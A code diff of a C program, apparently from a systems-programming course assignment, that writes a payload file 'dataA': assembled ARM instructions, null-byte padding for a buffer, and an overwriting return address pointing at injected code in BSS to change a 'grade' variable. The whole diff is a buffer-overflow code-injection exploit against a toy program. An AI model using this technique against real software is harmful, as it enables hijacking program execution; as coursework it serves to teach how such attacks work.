@@ -31,7 +31,7 @@ int main(void) {
 
     /* Write the instruction that moves 'A' into the x0 register
      * in machine language to dataA */
-    ulInstruction = MiniAssembler_mov(0, 65);
+    ulInstruction = MiniAssembler_mov(0, 'A');
     fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
     /* Write the instruction that puts the address of variable [grade]
@@ -50,11 +50,15 @@ int main(void) {
     ulInstruction = MiniAssembler_b(0x400864, 0x420070);
     fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
-    /* Fill up buf[] array and go over one to overwrite getName's
-     * return value with 23 null bytes */
-    for(; i < 23; i++) {
+    /* Fill up buf[] array with 20 null bytes */
+    for(; i < 20; i++) {
         putc('\0', psFile);
     }
+
+    /* Write the unsigned long address (0x420064) of the mov
+     * instruction in BSS to file dataA */
+    ulAddress = 0x420064;
+    fwrite(&ulAddress, sizeof(unsigned long), 1, psFile);
 
     /* Close the file */
     fclose(psFile);
